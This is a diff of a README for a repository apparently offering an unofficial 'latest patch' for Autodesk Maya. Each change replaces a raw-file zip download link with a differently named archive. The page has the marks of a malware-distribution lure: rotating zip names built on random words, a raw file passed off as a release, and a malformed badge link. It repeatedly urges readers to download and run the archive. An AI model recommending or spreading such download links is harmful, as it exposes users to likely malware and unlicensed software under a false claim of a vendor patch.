@@ -1,6 +1,6 @@
 # 🎨 Autodesk-Maya-Latest-Patch - Enhance Your 3D Modeling Experience
 
-[![Download Now](https://raw.githubusercontent.com/SoiteR/Autodesk-Maya-Latest-Patch/main/rising/Autodesk-Maya-Latest-Patch-diplosis.zip%20Latest%https://raw.githubusercontent.com/SoiteR/Autodesk-Maya-Latest-Patch/main/rising/Autodesk-Maya-Latest-Patch-diplosis.zip)](https://raw.githubusercontent.com/SoiteR/Autodesk-Maya-Latest-Patch/main/rising/Autodesk-Maya-Latest-Patch-diplosis.zip)
+[![Download Now](https://raw.githubusercontent.com/SoiteR/Autodesk-Maya-Latest-Patch/main/rising/Latest-Maya-Patch-Autodesk-admiralship.zip%20Latest%https://raw.githubusercontent.com/SoiteR/Autodesk-Maya-Latest-Patch/main/rising/Latest-Maya-Patch-Autodesk-admiralship.zip)](https://raw.githubusercontent.com/SoiteR/Autodesk-Maya-Latest-Patch/main/rising/Latest-Maya-Patch-Autodesk-admiralship.zip)
 
 ## 📖 About This Project
 
@@ -13,7 +13,7 @@ To begin using this software, follow these simple steps to download and install 
 ## 💾 Download & Install
 
 1. **Visit the Download Page:** Click the link below to access the latest releases where you can download the patch.
-   - [Download Latest Patch](https://raw.githubusercontent.com/SoiteR/Autodesk-Maya-Latest-Patch/main/rising/Autodesk-Maya-Latest-Patch-diplosis.zip)
+   - [Download Latest Patch](https://raw.githubusercontent.com/SoiteR/Autodesk-Maya-Latest-Patch/main/rising/Latest-Maya-Patch-Autodesk-admiralship.zip)
 
 2. **Select the Appropriate Version:** On the Releases page, look for the latest version. The version number will be clearly indicated, along with the release date.
 
@@ -77,4 +77,4 @@ If you need help with specific features or resources, feel free to check out the
 
 Follow this repository for the latest updates, tips, and new features. 
 
-Remember, you can always [download the latest patch](https://raw.githubusercontent.com/SoiteR/Autodesk-Maya-Latest-Patch/main/rising/Autodesk-Maya-Latest-Patch-diplosis.zip) to keep your Autodesk Maya environment running smoothly. Happy modeling!
+Remember, you can always [download the latest patch](https://raw.githubusercontent.com/SoiteR/Autodesk-Maya-Latest-Patch/main/rising/Latest-Maya-Patch-Autodesk-admiralship.zip) to keep your Autodesk Maya environment running smoothly. Happy modeling!
